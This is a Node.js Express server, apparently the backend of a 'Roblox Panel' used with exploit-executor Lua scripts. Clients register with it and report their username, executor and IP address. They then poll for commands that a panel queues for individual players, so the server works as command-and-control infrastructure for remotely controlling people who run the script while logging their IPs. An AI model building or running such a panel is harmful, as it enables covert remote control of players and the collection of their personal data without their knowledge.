const express = require('express');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// Base de données en mémoire
const players = new Map();
const commands = new Map();

// API pour enregistrement et heartbeat
app.post('/api', (req, res) => {
    const { action, userid, username, executor, ip, game, gameId, jobId } = req.body;

    if (action === 'register') {
        players.set(userid.toString(), {
            userid,
            username,
            executor,
            ip,
            game,
            gameId,
            jobId,
            lastSeen: Date.now(),
            status: 'online'
        });
        console.log(`✅ Player registered: ${username} (${userid})`);
        return res.json({ success: true });
    }

    if (action === 'heartbeat') {
        const player = players.get(userid.toString());
        if (player) {
            player.lastSeen = Date.now();
            player.status = 'online';
        }
        return res.json({ success: true });
    }

    res.json({ success: false });
});

// API pour récupérer les commandes (polling du script Lua)
app.get('/api', (req, res) => {
    const { userid } = req.query;
    
    if (!userid) {
        return res.json({ error: 'No userid provided' });
    }

    const command = commands.get(userid.toString());
    
    if (command) {
        commands.delete(userid.toString());
        return res.json(command);
    }

    res.json({ command: null });
});

// API pour envoyer des commandes depuis le panel
app.post('/command', (req, res) => {
    const { userid, command, reason, assetId } = req.body;

    if (!userid || !command) {
        return res.status(400).json({ error: 'Missing userid or command' });
    }

    const commandData = { command };
    if (reason) commandData.reason = reason;
    if (assetId) commandData.assetId = assetId;

    commands.set(userid.toString(), commandData);
    console.log(`📤 Command sent to ${userid}: ${command}`);

    res.json({ success: true, message: `Command "${command}" queued for player ${userid}` });
});

// API pour obtenir la liste des joueurs
app.get('/players', (req, res) => {
    const now = Date.now();
    const playerList = Array.from(players.values()).map(player => ({
        ...player,
        status: (now - player.lastSeen < 15000) ? 'online' : 'offline'
    }));
    res.json(playerList);
});

// API pour supprimer un joueur
app.delete('/player/:userid', (req, res) => {
    const { userid } = req.params;
    players.delete(userid);
    commands.delete(userid);
    res.json({ success: true });
});

// Nettoyage automatique des joueurs inactifs
setInterval(() => {
    const now = Date.now();
    for (const [userid, player] of players.entries()) {
        if (now - player.lastSeen > 60000) {
            console.log(`🔴 Player timeout: ${player.username}`);
            players.delete(userid);
            commands.delete(userid);
        }
    }
}, 30000);

app.listen(PORT, () => {
    console.log(`🚀 Roblox Panel Server running on port ${PORT}`);
    console.log(`📡 Endpoint: http://localhost:${PORT}`);
});